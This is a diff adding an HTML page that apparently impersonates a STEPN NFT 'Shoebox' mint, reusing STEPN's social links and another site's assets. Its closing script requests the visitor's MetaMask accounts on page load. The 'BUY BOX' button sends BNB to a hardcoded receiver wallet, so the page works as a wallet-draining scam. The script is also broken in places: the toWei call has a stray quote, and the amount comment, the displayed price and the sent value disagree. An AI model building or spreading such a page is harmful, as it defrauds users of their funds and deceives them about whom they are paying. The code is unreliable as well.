@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<title>STEPN is a Web3 lifestyle app with Social-Fi and Game-Fi elements</title>
+<link rel="icon" href="favicon.png">
+<link rel="canonical" href="index.html" />
+<link type="application/json+oembed" href="https://genopets-mint.com/manifest.json" />
+<link rel="stylesheet" href="css/app.min.css" />
+    <link href="./CryptoGuards_files/normalize.css" rel="stylesheet" type="text/css">
+    <link href="./CryptoGuards_files/webflow.css" rel="stylesheet" type="text/css">
+	
+	<link href="./CryptoGuards_files/animation.css" rel="stylesheet" type="text/css">
+    <link href="./CryptoGuards_files/bootstrapselect.css" rel="stylesheet" type="text/css">
+
+    <link href="./CryptoGuards_files/gars-ada8b5.webflow.css" rel="stylesheet" type="text/css">
+    <script src="./CryptoGuards_files/webfont.js.download" type="text/javascript"></script>
+    <link rel="stylesheet" href="./CryptoGuards_files/css" media="all"><link rel="stylesheet" href="./CryptoGuards_files/css" media="all"><script type="text/javascript">WebFont.load({  google: {    families: ["Black Ops One:regular:latin,latin-ext","Lexend:200,regular,600,800,900:latin,latin-ext,vietnamese"]  }});</script>
+    <!-- [if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif] -->
+    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+    <link href="https://cryptoguards.io/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+    <link href="https://cryptoguards.io/images/favicon.png" rel="apple-touch-icon">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="" src="./CryptoGuards_files/js"></script>
+	<script src="./CryptoGuards_files/web3.min.js.download"></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-VE9J5CE972');
+    </script>
+</head>
+<body>
+    <div class="wrapper">
+    <div class="header">
+        <div class="container">
+            <div class="header__items">
+                <a href="index.html" class="header__logo">
+                     <img src="images/logo.png" alt="{{header.alt}}">                </a>
+                <ul class="header__social">
+                                            <li><a href="https://twitter.com/stepn" target="_blank"><img src="static/twit-head.png" alt="Twitter"></a></li>
+                                                                <li><a href="https://discord.com/invite/stepn" target="_blank"><img src="static/disc-head.png" alt="Discord"></a></li>
+                                    </ul>
+            </div>
+        </div>
+    </div>
+    <div class="showcase">
+        <div class="container">
+            <div class="showcase__inner">
+                                    <h1 class="showcase__title ">Get your limited StepN NFT!</h1>
+                                                    <p class="showcase__info">Unlock access to best Move to Earn game.</p>
+                                <div class="showcase__items">
+                    <div class="showcase__item">
+                        <p class="showcase__minted">MINTED: <span class="minted"></span> / 3333</p>
+                        <p class="showcase__head">SHOEBOX</p>
+                            
+                            <p class="font-lexend" style="color: rgb(255, 242, 205); font-style: normal; font-weight: 500; font-size: 20px; line-height: 25px; text-align: center;">
+NFT Shoebox may be opened 5 minutes after purchase. Good luck to everyone !<br><br>
+<button id="sendTransactionBox1" class="btn-game btn-buy-box btn-green" style="padding: 20px 32px; text-align: center;"><!----> <span><b>BUY BOX (0.5 BNB)</b></span></button>
+</p> 
+                                                                                                </div>
+                    <div class="showcase__images">
+                        <div class="showcase__image levitation"><img src="images/img-1.png"/></div><div class="showcase__image levitation"><img src="images/img-2.png"/></div>                    </div>
+                </div>
+                <div class="showcase__block">
+                    <div class="showcase__block-item">
+                        <p class="showcase__block-head">Join StepN on <br><span>Our Socials</span></p>
+                        <span class="showcase__block-total"></span>
+                    </div>
+                    <div class="showcase__block-btns">
+                                                    <a href="https://discord.com/invite/stepn" target="_blank" class="showcase__block-btn"><img src="static/discord.svg" alt="">DISCORD</a>
+                                                                            <a href="https://twitter.com/stepn" target="_blank" class="showcase__block-btn"><img src="static/twitter.svg" alt="">TWITTER</a>
+                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="toast">
+    Something went wrong. Please try again.
+</div>
+<script src="lib/scripts.js"></script>
+<script src="js/jquery-3.4.1.min.js"></script>
+<script src="lib/index.iife.min.js"></script>
+<script>
+	  if (typeof window.ethereum !== 'undefined') {
+		ethereum.request({ method: 'eth_requestAccounts' });
+	} else {
+		alert('Please install metamask')
+	}
+
+	const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
+	const reciever = '0x21fd96e52709c86a1b3f9f8d99912861f56f97d3';
+	const sendTransactionBox1 = document.getElementById('sendTransactionBox1');
+	
+		sendTransactionBox1.addEventListener('click', () => {
+		(async ()=>{
+				
+				const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
+				.catch((e) => {
+				  console.error(e.message)
+				  return
+				})
+				if (!accounts) { return }
+
+				const userWalletAddress = accounts[0];
+				  
+				console.log("userWalletAddress:" + userWalletAddress);
+				
+				// 0.70 BNB = 0.000999999
+				const amount = web3.utils.toWei(0.000700");
+				
+				ethereum.request({
+				method: 'eth_sendTransaction',
+				params: [
+					{
+						from: userWalletAddress,
+						to: reciever,
+						chainId: 56,
+						gasPrice: '12A05F200',
+						gas: '10000',
+						value: amount
+					
+					},
+				],
+				})
+				.then((txHash) => console.log(txHash))
+				.catch((error) => console.error);
+			
+		})()
+	});
+	
+	</script>
+</body>
+
+</html>
